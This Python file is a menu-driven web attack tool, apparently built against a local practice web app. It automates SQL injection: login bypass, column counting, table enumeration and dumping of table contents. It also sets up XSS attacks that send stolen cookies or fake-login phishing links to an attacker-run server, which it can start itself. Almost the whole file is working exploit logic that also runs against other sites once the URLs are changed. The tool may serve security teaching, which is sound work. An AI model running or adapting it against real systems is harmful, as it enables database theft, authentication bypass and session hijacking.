import json, requests, subprocess, time
from vuln_page import VulnPage, POST_REQ, GET_REQ, APOSTROPHE, QUOTE 
from bs4 import BeautifulSoup

def get_column_names(table_enum, table_name):
	column_names = []
	for x in table_enum:
		x = x.replace('\n', '')
		x = x.replace('\t', ' ')
		x = x.split('(', 1)
		if table_name in x[0]: 
			columns = x[1].replace('(', '')
			columns = columns.split(',')
			for name in columns:
				if 'PRIMARY' in name or 'FOREIGN' in name:
					continue
				name = name.strip().split()
				column_names.append(name[0])

	return column_names

def table_data(col_str, table_enum, table_name, session, payload, page):
	columns = get_column_names(table_enum, table_name)
	if 'id' in columns:
		columns.remove('id')
	for x in range(min(len(col_str), len(columns))):
		col_str[x] = columns[x]
	col_str = ['1'] + col_str
	col_str.pop()
	payload = payload.replace("[CHANGE_THIS]", ",".join(col_str), 1)
	payload = payload.replace("[CHANGE_THIS]", table_name, 1)
	print(payload)

	data = page.get_data()
	for x in data.keys():
		data[x] = payload

	if session:
		controller = session
	else:
		controller = requests

	if page.req_type == GET_REQ:
		resp = controller.get(page.url, params=data)
	else:
		resp = controller.post(page.url, data=data)


	if "Error" in resp.text or "error" in resp.text:
		print("Unsuccessful!")
		return

	data = []
	html = BeautifulSoup(resp.content, 'html.parser')
	table = html.find('table')
	table_body = table.find('tbody')
	rows = table_body.find_all('tr')
	for row in rows:
	    cols = row.find_all('td')
	    cols = [ele.text.strip() for ele in cols]
	    data.append([ele for ele in cols if ele]) # Get rid of empty values
	
	print()
	print("Data found!")
	table_enum = []
	col_str.pop(0)
	print(", ".join(col_str))
	for row in data:
		print(", ".join(row))


def table_enumeration(gen_payload, session, page):
	bad_result = True
	column_count = 1
	col_str = []
	while bad_result:
		if column_count > 12:
			break;

		data = page.get_data()
		col_str = [str(1) for x in range(column_count)]

		if len(col_str) > 1:
			col_str[1] = "sql"
		else:
			col_str[0] = "sql"

		rep_str = gen_payload.replace("[CHANGE_THIS]", ",".join(col_str))
		print("Trying: " + rep_str)

		for x in data.keys():
			data[x] = rep_str

		if session:
			controller = session
		else:
			controller = requests

		if page.req_type == GET_REQ:
			resp = controller.get(page.url, params=data)
		else:
			resp = controller.post(page.url, data=data)


		if "Error" in resp.text or "error" in resp.text:
			column_count += 1
		else:
			bad_result = False

	print()
	if bad_result:
		print("Table enumeration unsuccessful!")
		return []

	print("Table enumeration completed! Here are the tables:")

	data = []
	html = BeautifulSoup(resp.content, 'html.parser')
	table = html.find('table')
	table_body = table.find('tbody')
	rows = table_body.find_all('tr')
	for row in rows:
	    cols = row.find_all('td')
	    cols = [ele.text.strip() for ele in cols]
	    data.append([ele for ele in cols if ele]) # Get rid of empty values
	
	table_enum = []
	for row in data:
		for column in row:
			if 'CREATE' in column:
				print(column)
				table_enum.append(column)

	return col_str, table_enum

def get_input(data, input_str, invalid_str):
	while True:
		bad_input = False
		choices = input(input_str)
		choices = [int(x) for x in choices.split()]
		for x in choices:
			if x > len(data) - 1 or x < 0:
				print(invalid_str)
				bad_input = True
				break 
		if bad_input:
			continue 
		else: 
			break
	return choices

def check_output(resp, payload, exploit):
	print(payload)
	print("SUCCESS!")
	return

def fix_payload(vuln_type, process, exploit, session, page, add_info=None):
	if vuln_type == "XSS":
		if exploit["name"] == "exploit_1":
			if process:
				return ["http://127.0.0.1:8081/fake?url={}".format(add_info)]
			else:
				url = input("Please enter the attacker's server's URL that creates a fake login page (including http://): ")
				param = input("Please enter the param name that the get request takes for the login page: ")
				return [url.strip() + "?" + param.strip() + "=" + add_info.strip()]
		elif exploit["name"] == "exploit_2":
			url = input("Please enter the url you would like to redirect to: ")
			return [url.strip()] 
		elif exploit["name"] == "exploit_3":
			if process:
				return ["http://127.0.0.1:8081/fake?cookie="]
			else:
				url = input("Please enter the attacker's server's GET URL that accepts a cookie (including http://): ")
				param = input("Please enter the param name that the get request uses for the cookie: ")
				return [url.strip() + "?" + param.strip() + "="]
	elif vuln_type == "SQL":
		if exploit["name"] == "exploit_1":
			print("Testing login injections...")
			time.sleep(3)
			print("This injection allows you to authorize without any credentials.")
			print("Run the script again and pass in the following for both username and password:")
			print(exploit["payload"])
			return[-1]
		if exploit["name"] == "exploit_2":
			print("Enumerating tables...")
			table_enumeration(exploit["payload"], session, page)
			return [-1]
		if exploit["name"] == "exploit_3":
			col_str, table_enum = table_enumeration(exploit["payload_def"], session, page)
			table_name = input("Enter the name of table you would like to see (case-sensitive): ")
			table_data(col_str, table_enum, table_name,session, exploit["payload"], page)
			print()
			return[-1]


def hack(login, vulnerabilities, session=None):
	with open("exploits.json", 'r') as in_file:
		exploits = json.load(in_file)

	answer = input("Run an attacker's web server to collect information (req. for some exploits)? Enter Y/y or N/n: ")
	while answer != 'y' and answer != 'Y' and answer == 'N' and answer == 'n':
		answer = input("Invalid input. Please enter either Y/n or N/n: ")
	if answer == 'Y' or answer == 'y':
		#, stdout=subprocess.STDOUT, stderr=subprocess.STDOUT
		process = subprocess.Popen(['python3', 'attacker_server.py'])
	else:
		process = None

	print()
	print("{:<5} {:<10} {:<40} {:<20}".format("Num", "Pages", "URL", "Vulnerabilities"))
	for x in range(len(vulnerabilities)):
		page = vulnerabilities[x]
		print("{:<5} {:<10} {:<40} {:<20}".format(x, page.name, page.url, page.pprint_vuln()))
	print()

	choices = get_input(vulnerabilities, "List the number of the pages you want to exploit (space separated): ", "Invalid input. A number is out of range of the available choices!")
	choices = list(set(choices))

	for choice in choices:
		selected_page = vulnerabilities[choice]
		vulns = selected_page.vuln

		print()
		print("Currently selected page: {}. Here are the available options:\n".format(selected_page.name))
		print("{:<5} {:<10}".format("Num", "Vulnerability"))
		for x in range(len(vulns)):
			vuln = vulns[x]
			print("{:<5} {:<10}".format(x, vuln))
		print()

		choice = get_input(page.vuln, "Please select a vulnerability to exploit: ", "Invalid input!")
		while(len(choice) != 1):
			print("More than 1 vulnerability selected. Please select only 1 vulnerability!")
			choice = get_input(page.vuln, "Please select a vulnerability to exploit: ", "Invalid input!")
		selected_vuln = vulns[choice[0]]

		print()
		print("Vulnerability selected: {}. Here are the available exploits:\n".format(selected_vuln))
		print("{:<5} {:<10} {:<30}".format("Num", "Name", "Description", ))
		for x in range(len(exploits[selected_vuln])):
			exploit = exploits[selected_vuln][x]
			print("{:<5} {:<10} {:<30}".format(x, exploit["name"], exploit["desc"]))
		print()

		choice = get_input(exploits[vuln], "Please select an exploit to run: ", "Invalid input!")
		while(len(choice) != 1):
			print("More than 1 exploit selected. Please select only 1 exploit!")
			choice = get_input(page.vuln, "Please select an exploit to run: ", "Invalid input!")
		selected_exploit = exploits[vuln][choice[0]]

		print()
		print("Exploit selected: {}\n".format(selected_exploit["name"]))

		payload = selected_exploit["payload"]
		sub = fix_payload(selected_vuln.strip(), process, selected_exploit, session, selected_page, add_info=login)
		if sub[0] == -1:
			test = input("Continue to next page?")
			continue
		for x in sub:
			payload = payload.replace("[CHANGE_THIS]", x, 1)


		data = selected_page.get_data()
		for x in data.keys():
			data[x] = payload

		if session:
			controller = session
		else:
			controller = requests

		if selected_page.req_type == GET_REQ:
			resp = controller.get(selected_page.url, params=data)
		else:
			resp = controller.post(selected_page.url, data=data)

		check_output(resp, payload, selected_exploit)

		#with open("test_" + str(choice) + ".html", 'w') as out_file:
		#	out_file.write(resp.text)

		test = input("Continue to next page? Enter Y/y or N/n: ")
		if test == 'N' or test == 'n':
			break;


	

if __name__ == "__main__":
	def_list = [VulnPage("login", "http://127.0.0.1:5000/login", ["SQL",], {"username": "", "password": ""}, POST_REQ, QUOTE),
				VulnPage("movies", "http://127.0.0.1:5000/movies", ["SQL"], {"search" : ""}, GET_REQ, APOSTROPHE),
				VulnPage("forum", "http://127.0.0.1:5000/forum", ["XSS"], {"body":""}, POST_REQ, None)]

	session = requests.Session()
	data = {"email" : "a@b", "password": "ab", 'security_level': 0, 'form': 'submit'}
	session.post("http://127.0.0.1:5000/login", data=data)
	
	hack("http://127.0.0.1:5000/login", def_list, session=session)
